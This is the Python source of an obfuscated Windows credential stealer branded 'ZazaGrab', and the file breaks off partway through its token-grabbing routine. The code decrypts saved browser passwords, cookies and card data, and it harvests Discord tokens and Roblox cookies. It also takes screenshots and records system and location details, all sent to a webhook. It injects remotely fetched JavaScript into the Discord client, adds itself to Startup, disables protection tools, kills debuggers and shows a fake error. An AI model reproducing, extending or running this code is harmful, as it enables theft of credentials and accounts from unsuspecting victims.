import asyncio #line:1
import json #line:2
import ntpath #line:3
import os #line:4
import random #line:5
import re #line:6
import shutil #line:7
import sqlite3 #line:8
import subprocess #line:9
import threading #line:10
import winreg #line:11
import zipfile #line:12
import httpx #line:13
import psutil #line:14
import win32gui #line:15
import win32con #line:16
import base64 #line:17
import requests #line:18
import ctypes #line:19
import time #line:20
from sqlite3 import connect #line:22
from base64 import b64decode #line:23
from urllib .request import Request ,urlopen #line:24
from shutil import copy2 #line:25
from datetime import datetime ,timedelta ,timezone #line:26
from sys import argv #line:27
from tempfile import gettempdir ,mkdtemp #line:28
from json import loads ,dumps #line:29
from ctypes import windll ,wintypes ,byref ,cdll ,Structure ,POINTER ,c_char ,c_buffer #line:30
from Crypto .Cipher import AES #line:31
from PIL import ImageGrab #line:32
from win32crypt import CryptUnprotectData #line:33
local =os .getenv ('LOCALAPPDATA')#line:36
roaming =os .getenv ('APPDATA')#line:37
temp =os .getenv ("TEMP")#line:38
Passw =[];#line:40
__config__ ={'yourwebhookurl':"%WEBHOOK_HERE%",'zazagrab_inject_url':"https://raw.githubusercontent.com/xKrustyDemonx/zaza-inject/main/index.js",'hide':'%_hide_script%','ping':'%ping_enabled%','pingtype':'%ping_type%','fake_error':'%_error_enabled%','startup':'%_startup_enabled%','kill_discord_process':'%kill_discord_process%','dbugkiller':'%_debugkiller%','blprggg':["httpdebuggerui","wireshark","fiddler","regedit","cmd","taskmgr","vboxservice","df5serv","processhacker","vboxtray","vmtoolsd","vmwaretray","ida64","ollydbg","pestudio","vmwareuser","vgauthservice","vmacthlp","x96dbg","vmsrvc","x32dbg","vmusrvc","prl_cc","prl_tools","xenservice","qemu-ga","joeboxcontrol","ksdumperclient","ksdumper","joeboxserver"]}#line:97
infocom =os .getlogin ()#line:102
vctm_pc =os .getenv ("COMPUTERNAME")#line:103
r4m =str (psutil .virtual_memory ()[0 ]/1024 **3 ).split (".")[0 ]#line:104
d1sk =str (psutil .disk_usage ('/')[0 ]/1024 **3 ).split (".")[0 ]#line:105
ZazaGrab_Regex ='https://pastebin.com/raw/f4PM9Dse'#line:107
reg_req =requests .get (ZazaGrab_Regex )#line:108
clear_reg =r"[\w-]{24}"+reg_req .text #line:109
class Functions (object ):#line:113
    @staticmethod #line:115
    def gtmk3y (O00O0O00O00O00OO0 :str or os .PathLike ):#line:116
        if not ntpath .exists (O00O0O00O00O00OO0 ):#line:117
            return None #line:118
        with open (O00O0O00O00O00OO0 ,"r",encoding ="utf-8")as O0000O000OO0O00OO :#line:119
            O0O00O00O000000OO =O0000O000OO0O00OO .read ()#line:120
        O0OOO0O000O000OOO =json .loads (O0O00O00O000000OO )#line:121
        try :#line:123
            OO0O00000OOOOOO00 =b64decode (O0OOO0O000O000OOO ["os_crypt"]["encrypted_key"])#line:124
            return Functions .w1nd0_dcr (OO0O00000OOOOOO00 [5 :])#line:125
        except KeyError :#line:126
            return None #line:127
    @staticmethod #line:129
    def cnverttim (O0O000000O00OO000 :int or float )->str :#line:130
        try :#line:131
            OOO0OOO00OO0O0O0O =datetime (1601 ,1 ,1 ,tzinfo =timezone .utc )#line:132
            O0O0OO00O0OO00000 =OOO0OOO00OO0O0O0O +timedelta (microseconds =O0O000000O00OO000 )#line:133
            return O0O0OO00O0OO00000 #line:134
        except Exception :#line:135
            pass #line:136
    @staticmethod #line:138
    def w1nd0_dcr (OO0O0O0OO00OO0OO0 :bytes )->str :#line:139
        return CryptUnprotectData (OO0O0O0OO00OO0OO0 ,None ,None ,None ,0 )[1 ]#line:140
    @staticmethod #line:142
    def cr34t3_f1lkes (_dir :str or os .PathLike =gettempdir ()):#line:143
        O0O000O000OO0O000 =''.join (random .SystemRandom ().choice ('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789')for _O0O00OO0000O0000O in range (random .randint (10 ,20 )))#line:144
        OO000OOO000O00O00 =ntpath .join (_dir ,O0O000O000OO0O000 )#line:145
        open (OO000OOO000O00O00 ,"x")#line:146
        return OO000OOO000O00O00 #line:147
    @staticmethod #line:149
    def dcrpt_val (OOO0OO0000OO0OO00 ,OOOO0O00000000O00 )->str :#line:150
        try :#line:151
            O0000OO0OOOOOO0O0 =OOO0OO0000OO0OO00 [3 :15 ]#line:152
            OO0O0O000O0O0000O =OOO0OO0000OO0OO00 [15 :]#line:153
            O0O000OOO000O0O0O =AES .new (OOOO0O00000000O00 ,AES .MODE_GCM ,O0000OO0OOOOOO0O0 )#line:154
            O0O0O0OOO0O0O00OO =O0O000OOO000O0O0O .decrypt (OO0O0O000O0O0000O )#line:155
            O0O0O0OOO0O0O00OO =O0O0O0OOO0O0O00OO [:-16 ].decode ()#line:156
            return O0O0O0OOO0O0O00OO #line:157
        except Exception :#line:158
            return f'Failed to decrypt "{str(OOO0OO0000OO0OO00)}" | key: "{str(OOOO0O00000000O00)}"'#line:159
    @staticmethod #line:161
    def g3t_H (token :str =None ):#line:162
        O00OO00O0000O00OO ={"Content-Type":"application/json",}#line:165
        if token :#line:166
            O00OO00O0000O00OO .update ({"Authorization":token })#line:167
        return O00OO00O0000O00OO #line:168
    @staticmethod #line:170
    def sys_1fo ()->list :#line:171
        O0O00000O000O0OO0 =0x08000000 #line:172
        O000O00O0O0O0O000 ="wmic csproduct get uuid"#line:173
        OOOOOO00O0O00000O ="powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\SoftwareProtectionPlatform' -Name BackupProductKeyDefault"#line:174
        O0O0000OO00O0OO0O ="powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion' -Name ProductName"#line:175
        try :#line:176
            O0000OOOO00OOOO00 =subprocess .check_output (O000O00O0O0O0O000 ,creationflags =O0O00000O000O0OO0 ).decode ().split ('\n')[1 ].strip ()#line:177
        except Exception :#line:178
            O0000OOOO00OOOO00 ="N/A"#line:179
        try :#line:180
            O00OOO000O0OO0O00 =subprocess .check_output (OOOOOO00O0O00000O ,creationflags =O0O00000O000O0OO0 ).decode ().rstrip ()#line:181
        except Exception :#line:182
            O00OOO000O0OO0O00 ="N/A"#line:183
        try :#line:184
            O0O00O0O0OO00OOOO =subprocess .check_output (O0O0000OO00O0OO0O ,creationflags =O0O00000O000O0OO0 ).decode ().rstrip ()#line:185
        except Exception :#line:186
            O0O00O0O0OO00OOOO ="N/A"#line:187
        return [O0000OOOO00OOOO00 ,O0O00O0O0OO00OOOO ,O00OOO000O0OO0O00 ]#line:188
    @staticmethod #line:191
    def net_1fo ()->list :#line:192
        O0O0000O0O0OO000O ,O00O0O0O0OOO0O0O0 ,OO00O00O0OOO00O0O ,OOOOOO00O00O00OOO ,O0OO0O0O0OO000O0O ,O0O00O00000OO0O00 ,O0O0O00000OOOOO00 ="None","None","None","None","None","None","None"#line:193
        OOOOOO0O0OO0O0OO0 =httpx .get ("https://ipinfo.io/json")#line:194
        if OOOOOO0O0OO0O0OO0 .status_code ==200 :#line:195
            OO0OOOO000O000OO0 =OOOOOO0O0OO0O0OO0 .json ()#line:196
            O0O0000O0O0OO000O =OO0OOOO000O000OO0 .get ('ip')#line:197
            O00O0O0O0OOO0O0O0 =OO0OOOO000O000OO0 .get ('city')#line:198
            OO00O00O0OOO00O0O =OO0OOOO000O000OO0 .get ('country')#line:199
            OOOOOO00O00O00OOO =OO0OOOO000O000OO0 .get ('region')#line:200
            O0OO0O0O0OO000O0O =OO0OOOO000O000OO0 .get ('org')#line:201
            O0O00O00000OO0O00 =OO0OOOO000O000OO0 .get ('loc')#line:202
            O0O0O00000OOOOO00 ="https://www.google.com/maps/search/google+map++"+O0O00O00000OO0O00 #line:203
        return [O0O0000O0O0OO000O ,O00O0O0O0OOO0O0O0 ,OO00O00O0OOO00O0O ,OOOOOO00O00O00OOO ,O0OO0O0O0OO000O0O ,O0O00O00000OO0O00 ,O0O0O00000OOOOO00 ]#line:204
    @staticmethod #line:206
    def fetch_conf (O000O0000O0O000OO :str )->str or bool |None :#line:207
        return __config__ .get (O000O0000O0O000OO )#line:208
class bl4ckc4p (Functions ):#line:213
    def __init__ (O0O000OOOOO0OO000 ):#line:214
        O0O000OOOOO0OO000 .dscap1 ="https://discord.com/api/v9/users/@me"#line:216
        O0O000OOOOO0OO000 .w3bh00k =O0O000OOOOO0OO000 .fetch_conf ('yourwebhookurl')#line:218
        O0O000OOOOO0OO000 .hide =O0O000OOOOO0OO000 .fetch_conf ("hide")#line:220
        O0O000OOOOO0OO000 .pingtype =O0O000OOOOO0OO000 .fetch_conf ("pingtype")#line:222
        O0O000OOOOO0OO000 .pingonrun =O0O000OOOOO0OO000 .fetch_conf ("ping")#line:224
        O0O000OOOOO0OO000 .baseurl ="https://discord.com/api/v9/users/@me"#line:226
        O0O000OOOOO0OO000 .startupexe =O0O000OOOOO0OO000 .fetch_conf ("startup")#line:228
        O0O000OOOOO0OO000 .fake_error =O0O000OOOOO0OO000 .fetch_conf ("fake_error")#line:230
        O0O000OOOOO0OO000 .appdata =os .getenv ("localappdata")#line:232
        O0O000OOOOO0OO000 .roaming =os .getenv ("appdata")#line:234
        O0O000OOOOO0OO000 .chrmmuserdtt =ntpath .join (O0O000OOOOO0OO000 .appdata ,'Google','Chrome','User Data')#line:236
        O0O000OOOOO0OO000 .dir ,O0O000OOOOO0OO000 .temp =mkdtemp (),gettempdir ()#line:238
        OOOOOOOOOO00O00OO ,O00O000O000O0OO00 =O0O000OOOOO0OO000 .sys_1fo (),O0O000OOOOO0OO000 .net_1fo ()#line:240
        O0O000OOOOO0OO000 .uuidwndz ,O0O000OOOOO0OO000 .w1nv3r ,O0O000OOOOO0OO000 .w1nk33y =OOOOOOOOOO00O00OO [0 ],OOOOOOOOOO00O00OO [1 ],OOOOOOOOOO00O00OO [2 ]#line:242
        O0O000OOOOO0OO000 .ip ,O0O000OOOOO0OO000 .city ,O0O000OOOOO0OO000 .country ,O0O000OOOOO0OO000 .region ,O0O000OOOOO0OO000 .org ,O0O000OOOOO0OO000 .loc ,O0O000OOOOO0OO000 .googlemap =O00O000O000O0OO00 [0 ],O00O000O000O0OO00 [1 ],O00O000O000O0OO00 [2 ],O00O000O000O0OO00 [3 ],O00O000O000O0OO00 [4 ],O00O000O000O0OO00 [5 ],O00O000O000O0OO00 [6 ]#line:244
        O0O000OOOOO0OO000 .srtupl0c =ntpath .join (O0O000OOOOO0OO000 .roaming ,'Microsoft','Windows','Start Menu','Programs','Startup')#line:246
        O0O000OOOOO0OO000 .h00ksreg ="api/webhooks"#line:248
        O0O000OOOOO0OO000 .chrmrgx =re .compile (r'(^profile\s\d*)|default|(guest profile$)',re .IGNORECASE |re .MULTILINE );#line:250
        O0O000OOOOO0OO000 .baseurl ="https://discord.com/api/v9/users/@me"#line:252
        O0O000OOOOO0OO000 .regex =clear_reg #line:254
        O0O000OOOOO0OO000 .encrypted_regex =r"dQw4w9WgXcQ:[^\"]*"#line:256
        O0O000OOOOO0OO000 .tokens =[]#line:258
        O0O000OOOOO0OO000 .ids =[]#line:260
        O0O000OOOOO0OO000 .sep =os .sep ;#line:262
        O0O000OOOOO0OO000 .robloxcookies =[];#line:264
        O0O000OOOOO0OO000 .chrome_key =O0O000OOOOO0OO000 .gtmk3y (ntpath .join (O0O000OOOOO0OO000 .chrmmuserdtt ,"Local State"));#line:266
        os .makedirs (O0O000OOOOO0OO000 .dir ,exist_ok =True );#line:269
    def hiding (OOO0OOOOO0O000000 :str )->str :#line:274
        if OOO0OOOOO0O000000 .hide =="yes":#line:275
            O0OO0000OOO00O0O0 =win32gui .GetForegroundWindow ()#line:276
            win32gui .ShowWindow (O0OO0000OOO00O0O0 ,win32con .SW_HIDE )#line:277
    def fakeerror (OO0OOOOOO000OOOO0 :str )->str :#line:279
        if OO0OOOOOO000OOOO0 .fake_error =="yes":#line:280
            ctypes .windll .user32 .MessageBoxW (None ,'Error code: ZazaGrab_0x988958\nSomething gone wrong.','Fatal Error',0 )#line:281
    def pingonrunning (OO00OOOOO0O0OO0O0 :str )->str :#line:283
        O00OOO0O0OOOO00O0 ={'avatar_url':'https://media.discordapp.net/attachments/1055997057149710388/1066504205835173928/zazagrab2.jpg','content':"@everyone"}#line:287
        O00OO000O0O0OO0OO ={'avatar_url':'https://media.discordapp.net/attachments/1055997057149710388/1066504205835173928/zazagrab2.jpg','content':"@here"}#line:291
        if OO00OOOOO0O0OO0O0 .pingonrun =="yes":#line:292
            if OO00OOOOO0O0OO0O0 .h00ksreg in OO00OOOOO0O0OO0O0 .w3bh00k :#line:293
                if OO00OOOOO0O0OO0O0 .pingtype =="@everyone"or OO00OOOOO0O0OO0O0 .pingtype =="everyone":#line:294
                    httpx .post (OO00OOOOO0O0OO0O0 .w3bh00k ,json =O00OOO0O0OOOO00O0 )#line:295
            if OO00OOOOO0O0OO0O0 .pingtype =="@here"or OO00OOOOO0O0OO0O0 .pingtype =="here":#line:296
                if OO00OOOOO0O0OO0O0 .h00ksreg in OO00OOOOO0O0OO0O0 .w3bh00k :#line:297
                    httpx .post (OO00OOOOO0O0OO0O0 .w3bh00k ,json =O00OO000O0O0OO0OO )#line:298
    def startupzazagrab (O0OO0O00OOO0OO0OO :str )->str :#line:302
        if O0OO0O00OOO0OO0OO .startupexe =="yes":#line:303
            O0OO0O0OO0OOO000O =os .getenv ("appdata")+"\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"#line:304
            if os .path .exists (O0OO0O0OO0OOO000O +argv [0 ]):#line:305
                os .remove (O0OO0O0OO0OOO000O +argv [0 ])#line:306
                copy2 (argv [0 ],O0OO0O0OO0OOO000O )#line:307
            else :#line:308
                copy2 (argv [0 ],O0OO0O0OO0OOO000O )#line:309
    def _bexit (O0O000OO0OO0OOO00 ):#line:314
        shutil .rmtree (O0O000OO0OO0OOO00 .dir ,ignore_errors =True )#line:315
        os ._exit (0 )#line:316
    def trexctrac (OOOO000OOO0OOO00O ):#line:318
        ""#line:319
        def OOOO0O00O0OOO00O0 (*O0O0O0OOOO00O0OO0 ,**OO0OOOO00O00O0OOO ):#line:320
            try :#line:321
                OOOO000OOO0OOO00O (*O0O0O0OOOO00O0OO0 ,**OO0OOOO00O00O0OOO )#line:322
            except Exception :#line:323
                pass #line:324
        return OOOO0O00O0OOO00O0 #line:325
    async def init (O00OO0000OO0OOOOO ):#line:327
        O00OO0000OO0OOOOO .browsers ={'amigo':O00OO0000OO0OOOOO .appdata +'\\Amigo\\User Data','torch':O00OO0000OO0OOOOO .appdata +'\\Torch\\User Data','kometa':O00OO0000OO0OOOOO .appdata +'\\Kometa\\User Data','orbitum':O00OO0000OO0OOOOO .appdata +'\\Orbitum\\User Data','cent-browser':O00OO0000OO0OOOOO .appdata +'\\CentBrowser\\User Data','7star':O00OO0000OO0OOOOO .appdata +'\\7Star\\7Star\\User Data','sputnik':O00OO0000OO0OOOOO .appdata +'\\Sputnik\\Sputnik\\User Data','vivaldi':O00OO0000OO0OOOOO .appdata +'\\Vivaldi\\User Data','google-chrome-sxs':O00OO0000OO0OOOOO .appdata +'\\Google\\Chrome SxS\\User Data','google-chrome':O00OO0000OO0OOOOO .appdata +'\\Google\\Chrome\\User Data','epic-privacy-browser':O00OO0000OO0OOOOO .appdata +'\\Epic Privacy Browser\\User Data','microsoft-edge':O00OO0000OO0OOOOO .appdata +'\\Microsoft\\Edge\\User Data','uran':O00OO0000OO0OOOOO .appdata +'\\uCozMedia\\Uran\\User Data','yandex':O00OO0000OO0OOOOO .appdata +'\\Yandex\\YandexBrowser\\User Data','brave':O00OO0000OO0OOOOO .appdata +'\\BraveSoftware\\Brave-Browser\\User Data','iridium':O00OO0000OO0OOOOO .appdata +'\\Iridium\\User Data',}#line:345
        O00OO0000OO0OOOOO .profiles =['Default','Profile 1','Profile 2','Profile 3','Profile 4','Profile 5',]#line:354
        if O00OO0000OO0OOOOO .w3bh00k ==""or O00OO0000OO0OOOOO .w3bh00k =="\x57EBHOOK_HERE":#line:356
            O00OO0000OO0OOOOO ._bexit ()#line:357
        O00OO0000OO0OOOOO .hiding ()#line:359
        O00OO0000OO0OOOOO .fakeerror ()#line:360
        O00OO0000OO0OOOOO .pingonrunning ()#line:361
        O00OO0000OO0OOOOO .startupzazagrab ()#line:362
        if O00OO0000OO0OOOOO .fetch_conf ('dbugkiller')and AntiDebug ().inVM is True :#line:364
            O00OO0000OO0OOOOO ._bexit ()#line:365
        await O00OO0000OO0OOOOO .bypbd ()#line:366
        await O00OO0000OO0OOOOO .byptknp ()#line:367
        O0OO0OOOO0O000000 =[O00OO0000OO0OOOOO .scrinsh ,O00OO0000OO0OOOOO .sysd1 ,O00OO0000OO0OOOOO .grbtkn ,O00OO0000OO0OOOOO .grbmc ,O00OO0000OO0OOOOO .grbr0blx ]#line:369
        if O00OO0000OO0OOOOO .fetch_conf ('kill_discord_process'):#line:372
            await O00OO0000OO0OOOOO .kllprcsx ()#line:374
        os .makedirs (ntpath .join (O00OO0000OO0OOOOO .dir ,'Browsers'),exist_ok =True )#line:378
        for OOO0O00OOOO00O0O0 ,OOOO0O0OO0OOOOOOO in O00OO0000OO0OOOOO .browsers .items ():#line:379
            if not os .path .isdir (OOOO0O0OO0OOOOOOO ):#line:380
                continue #line:381
            O00OO0000OO0OOOOO .masterkey =O00OO0000OO0OOOOO .gtmk3y (OOOO0O0OO0OOOOOOO +'\\Local State')#line:383
            O00OO0000OO0OOOOO .funcs =[O00OO0000OO0OOOOO .grbcook ,O00OO0000OO0OOOOO .gethistez ,O00OO0000OO0OOOOO .grbpsw2 ,O00OO0000OO0OOOOO .getccez ]#line:389
            for O000O0OOOOO0000O0 in O00OO0000OO0OOOOO .profiles :#line:391
                for O0O000O00000000O0 in O00OO0000OO0OOOOO .funcs :#line:392
                    try :#line:393
                        O0O000O00000000O0 (OOO0O00OOOO00O0O0 ,OOOO0O0OO0OOOOOOO ,O000O0OOOOO0000O0 )#line:394
                    except :#line:395
                        pass #line:396
        if ntpath .exists (O00OO0000OO0OOOOO .chrmmuserdtt )and O00OO0000OO0OOOOO .chrome_key is not None :#line:398
            os .makedirs (ntpath .join (O00OO0000OO0OOOOO .dir ,'Google'),exist_ok =True )#line:399
            O0OO0OOOO0O000000 .extend ([O00OO0000OO0OOOOO .grbpsw ,O00OO0000OO0OOOOO .grbcoke ,O00OO0000OO0OOOOO .grbhis ])#line:400
        for O0O000O00000000O0 in O0OO0OOOO0O000000 :#line:402
            O0O0O0OOO0O0O0000 =threading .Thread (target =O0O000O00000000O0 ,daemon =True )#line:403
            O0O0O0OOO0O0O0000 .start ()#line:404
        for OO0OO00000OOOOO00 in threading .enumerate ():#line:405
            try :#line:406
                OO0OO00000OOOOO00 .join ()#line:407
            except RuntimeError :#line:408
                continue #line:409
        O00OO0000OO0OOOOO .ntfytkn ()#line:410
        await O00OO0000OO0OOOOO ._1ject ()#line:411
        O00OO0000OO0OOOOO .ending ()#line:412
    async def _1ject (O00OO0000OO0000OO ):#line:416
        for _OO0OOO0OOO0OOO0O0 in os .listdir (O00OO0000OO0000OO .appdata ):#line:418
            if 'discord'in _OO0OOO0OOO0OOO0O0 .lower ():#line:420
                O0OO00000O000O00O =O00OO0000OO0000OO .appdata +os .sep +_OO0OOO0OOO0OOO0O0 #line:421
                for __O00000OOOOO0000OO in os .listdir (ntpath .abspath (O0OO00000O000O00O )):#line:422
                    if re .match (r'app-(\d*\.\d*)*',__O00000OOOOO0000OO ):#line:424
                        O0O00000OOO0O0OO0 =ntpath .abspath (ntpath .join (O0OO00000O000O00O ,__O00000OOOOO0000OO ))#line:425
                        OO00O0O00OOO0OO00 =ntpath .join (O0O00000OOO0O0OO0 ,'modules')#line:426
                        if not ntpath .exists (OO00O0O00OOO0OO00 ):#line:429
                            return #line:430
                        for __O0OOOO00OOO000O00 in os .listdir (OO00O0O00OOO0OO00 ):#line:433
                            if re .match (r"discord_desktop_core-\d+",__O0OOOO00OOO000O00 ):#line:435
                                O0O0OO00000OOO00O =OO00O0O00OOO0OO00 +os .sep +__O0OOOO00OOO000O00 +f'\\discord_desktop_core\\'#line:436
                                if ntpath .exists (O0O0OO00000OOO00O ):#line:438
                                    if O00OO0000OO0000OO .srtupl0c not in argv [0 ]:#line:440
                                        try :#line:441
                                            os .makedirs (O0O0OO00000OOO00O +'zazagrab',exist_ok =True )#line:442
                                        except PermissionError :#line:443
                                            pass #line:444
                                    if O00OO0000OO0000OO .h00ksreg in O00OO0000OO0000OO .w3bh00k :#line:446
                                        O000OO0O000O000O0 =httpx .get (O00OO0000OO0000OO .fetch_conf ('zazagrab_inject_url')).text .replace ("%WEBHOOK%",O00OO0000OO0000OO .w3bh00k )#line:447
                                    try :#line:449
                                        with open (O0O0OO00000OOO00O +'index.js','w',errors ="ignore")as OO0OOO0OO00OOO0OO :#line:450
                                            OO0OOO0OO00OOO0OO .write (O000OO0O000O000O0 )#line:451
                                    except PermissionError :#line:452
                                        pass #line:453
                                    if O00OO0000OO0000OO .fetch_conf ('kill_discord_process'):#line:455
                                        os .startfile (O0O00000OOO0O0OO0 +O00OO0000OO0000OO .sep +_OO0OOO0OOO0OOO0O0 +'.exe')#line:456
    async def byptknp (OO00000O0OO0O0000 ):#line:458
        OOOO0000OO0OO0O0O =f"{OO00000O0OO0O0000.roaming}\\DiscordTokenProtector\\"#line:459
        if not ntpath .exists (OOOO0000OO0OO0O0O ):#line:460
            return #line:461
        OOO00O00O000OO00O =OOOO0000OO0OO0O0O +"config.json"#line:462
        for OO0O000000O0000O0 in ["DiscordTokenProtector.exe","ProtectionPayload.dll","secure.dat"]:#line:464
            try :#line:465
                os .remove (OOOO0000OO0OO0O0O +OO0O000000O0000O0 )#line:466
            except FileNotFoundError :#line:467
                pass #line:468
        if ntpath .exists (OOO00O00O000OO00O ):#line:469
            with open (OOO00O00O000OO00O ,errors ="ignore")as O0O0OOOO00O0OOO0O :#line:470
                try :#line:471
                    O0OOO0OO00000O0OO =json .load (O0O0OOOO00O0OOO0O )#line:472
                except json .decoder .JSONDecodeError :#line:473
                    return #line:474
                O0OOO0OO00000O0OO ['ksch_is_here']="https://github.com/xKrustyDemonx"#line:475
                O0OOO0OO00000O0OO ['auto_start']=False #line:476
                O0OOO0OO00000O0OO ['auto_start_discord']=False #line:477
                O0OOO0OO00000O0OO ['integrity']=False #line:478
                O0OOO0OO00000O0OO ['integrity_allowbetterdiscord']=False #line:479
                O0OOO0OO00000O0OO ['integrity_checkexecutable']=False #line:480
                O0OOO0OO00000O0OO ['integrity_checkhash']=False #line:481
                O0OOO0OO00000O0OO ['integrity_checkmodule']=False #line:482
                O0OOO0OO00000O0OO ['integrity_checkscripts']=False #line:483
                O0OOO0OO00000O0OO ['integrity_checkresource']=False #line:484
                O0OOO0OO00000O0OO ['integrity_redownloadhashes']=False #line:485
                O0OOO0OO00000O0OO ['iterations_iv']=364 #line:486
                O0OOO0OO00000O0OO ['iterations_key']=457 #line:487
                O0OOO0OO00000O0OO ['version']=69420 #line:488
            with open (OOO00O00O000OO00O ,'w')as O0O0OOOO00O0OOO0O :#line:489
                json .dump (O0OOO0OO00000O0OO ,O0O0OOOO00O0OOO0O ,indent =2 ,sort_keys =True )#line:490
            with open (OOO00O00O000OO00O ,'a')as O0O0OOOO00O0OOO0O :#line:491
                O0O0OOOO00O0OOO0O .write ("\n\n//Soles_is_here | https://github.com/xKrustyDemonx")#line:492
    async def kllprcsx (O0O0000O0OO00O0OO ):#line:494
        OOO0O00O000OO00O0 =O0O0000O0OO00O0OO .fetch_conf ('blprggg')#line:495
        for OOO00000O0O00OOOO in ['discord','discordtokenprotector','discordcanary','discorddevelopment','discordptb']:#line:496
            OOO0O00O000OO00O0 .append (OOO00000O0O00OOOO )#line:497
        for OOO0OOO0O0OOO00O0 in psutil .process_iter ():#line:498
            if any (O00OOO00O0O0OOOOO in OOO0OOO0O0OOO00O0 .name ().lower ()for O00OOO00O0O0OOOOO in OOO0O00O000OO00O0 ):#line:499
                try :#line:500
                    OOO0OOO0O0OOO00O0 .kill ()#line:501
                except (psutil .NoSuchProcess ,psutil .AccessDenied ):#line:502
                    pass #line:503
    async def bypbd (OO000OO00OO00O0O0 ):#line:506
        OOO000OO00OOO0OOO =OO000OO00OO00O0O0 .roaming +"\\BetterDiscord\\data\\betterdiscord.asar"#line:507
        if ntpath .exists (OOO000OO00OOO0OOO ):#line:508
            O00OO0OO0O0O0O0O0 =OO000OO00OO00O0O0 .h00ksreg #line:509
            with open (OOO000OO00OOO0OOO ,'r',encoding ="cp437",errors ='ignore')as OOOO00O000OOO000O :#line:510
                OOOO00OO0O00O00OO =OOOO00O000OOO000O .read ()#line:511
                O0O00OO00000O0O0O =OOOO00OO0O00O00OO .replace (O00OO0OO0O0O0O0O0 ,'KSCHishere')#line:512
            with open (OOO000OO00OOO0OOO ,'w',newline ='',encoding ="cp437",errors ='ignore')as OOOO00O000OOO000O :#line:513
                OOOO00O000OOO000O .write (O0O00OO00000O0O0O )#line:514
    @trexctrac #line:516
    def decrypt_val (O00OOO0O0O000O0O0 ,OOOOOO00000O00O00 ,O00000O0OOOOOO0OO ):#line:517
        try :#line:518
            OOOO0000000O000O0 =OOOOOO00000O00O00 [3 :15 ]#line:519
            O0O0O0OO000OO00O0 =OOOOOO00000O00O00 [15 :]#line:520
            OOO000O000000O0O0 =AES .new (O00000O0OOOOOO0OO ,AES .MODE_GCM ,OOOO0000000O000O0 )#line:521
            OO000OOOO0000OOO0 =OOO000O000000O0O0 .decrypt (O0O0O0OO000OO00O0 )#line:522
            OO000OOOO0000OOO0 =OO000OOOO0000OOO0 [:-16 ].decode ()#line:523
            return OO000OOOO0000OOO0 #line:524
        except Exception :#line:525
            return "Failed to decrypt password"#line:526
    def get_master_key (O00OOO000OO00000O ,O00O0O0O0O0O0OO00 ):#line:528
        with open (O00O0O0O0O0O0OO00 ,"r",encoding ="utf-8")as O0OOOO0OO0OO000O0 :#line:529
            OOO0O00O0OO0O00OO =O0OOOO0OO0OO000O0 .read ()#line:530
        O0O0OOOOO0O00000O =json .loads (OOO0O00O0OO0O00OO )#line:531
        O00OOOO0O0OO000OO =base64 .b64decode (O0O0OOOOO0O00000O ["os_crypt"]["encrypted_key"])#line:532
        O00OOOO0O0OO000OO =O00OOOO0O0OO000OO [5 :]#line:533
        O00OOOO0O0OO000OO =CryptUnprotectData (O00OOOO0O0OO000OO ,None ,None ,None ,0 )[1 ]#line:534
        return O00OOOO0O0OO000OO #line:535
    def grbtkn (O00OO00OOOO0OO0O0 ):#line:537
        OO0OO0O00O0000O0O ={'Discord':O00OO00OOOO0OO0O0 .roaming +'\\discord\\Local Storage\\leveldb\\','Discord Canary':O00OO00OOOO0OO0O0 .roaming +'\\discordcanary\\Local Storage\\leveldb\\','Lightcord':O00OO00OOOO0OO0O0 .roaming +'\\Lightcord\\Local Storage\\leveldb\\','Discord PTB':O00OO00OOOO0OO0O0 .roaming +'\\discordptb\\Local Storage\\leveldb\\','Opera':O00OO00OOOO0OO0O0 .roaming +'\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\','Opera GX':O00OO00OOOO0OO0O0 .roaming +'\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\','Amigo':O00OO00OOOO0OO0O0 .appdata +'\\Amigo\\User Data\\Local Storage\\leveldb\\','Torch':O00OO00OOOO0OO0O0 .appdata +'\\Torch\\User Data\\Local Storage\\leveldb\\','Kometa':O00OO00OOOO0OO0O0 .appdata +'\\Kometa\\User Data\\Local Storage\\leveldb\\','Orbitum':O00OO00OOOO0OO0O0 .appdata +'\\Orbitum\\User Data\\Local Storage\\leveldb\\','CentBrowser':O00OO00OOOO0OO0O0 .appdata +'\\CentBrowser\\User Data\\Local Storage\\leveldb\\','7Star':O00OO00OOOO0OO0O0 .appdata +'\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\','Sputnik':O00OO00OOOO0OO0O0 .appdata +'\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\','Vivaldi':O00OO00OOOO0OO0O0 .appdata +'\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\','Chrome SxS':O00OO00OOOO0OO0O0 .appdata +'\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\','Chrome':O00OO00OOOO0OO0O0 .appdata +'\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\','Chrome1':O00OO00OOOO0OO0O0 .appdata +'\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb\\','Chrome2':O00OO00OOOO0OO0O0 .appdata +'\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb\\','Chrome3':O00OO00OOOO0OO0O0 .appdata +'\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb\\','Chrome4':O00OO00OOOO0OO0O0 .appdata +'\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb\\','Chrome5':O00OO00OOOO0OO0O0 .appdata +'\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb\\','Epic Privacy Browser':O00OO00OOOO0OO0O0 .appdata +'\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\','Microsoft Edge':O00OO00OOOO0OO0O0 .appdata +'\\Microsoft\\Edge\\User Data\\Defaul\\Local Storage\\leveldb\\','Uran':O00OO00OOOO0OO0O0 .appdata +'\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\','Yandex':O00OO00OOOO0OO0O0 .appdata +'\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\','Brave':O00OO00OOOO0OO0O0 .appdata +'\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\','Iridium':O00OO00OOOO0OO0O0 .appdata +'\\Iridium\\User 